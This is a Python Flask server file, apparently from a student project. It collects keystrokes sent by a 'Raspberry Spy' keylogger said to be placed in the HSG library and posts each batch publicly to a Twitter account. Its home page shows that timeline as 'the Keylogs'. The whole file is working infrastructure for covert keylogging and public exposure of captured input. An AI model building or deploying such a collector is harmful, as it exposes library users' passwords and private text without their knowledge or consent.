import os
from flask import Flask
from flask import request #otherwise request. wont be recognized, requests via pip doesnt work
from library import create_tweet

# bootstrap the app
app = Flask(__name__)

# set the port dynamically with a default of 3000 for local development
port = int(os.getenv('PORT', '3000'))

# our base route which just returns a string
@app.route('/')
def twitter_website():
    return '''
    <html><body>
    <h1>Hi, these are the Keylogs from the Raspberry [S]py which is located at the HSG library.</h1>
    <p><a class="twitter-timeline" href="https://twitter.com/gigerbytes?ref_src=twsrc%5Etfw">
    Tweets by gigerbytes</a> 
    <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></p>
    </body></html>
    '''
# --> implementing the twitter timeline as html code in python

@app.route("/in_string") #endpoint
def get_string():   #for 'GET' Data ('POST' would be more secure, but isnt as instructive for our purposes)
    keys_received = request.args.get("key_info") # "key_info" corresponds with the RaspberrySpy keylogger.py 'GET'
    print(keys_received) #to have some feedback in the flask log
    create_tweet("[HSGbib] " + keys_received) #refers to function in the library for tweeting the keys received         
 
    return "OK"    
    
# start the app
if __name__ == '__main__':

    app.run(host='0.0.0.0', port=port)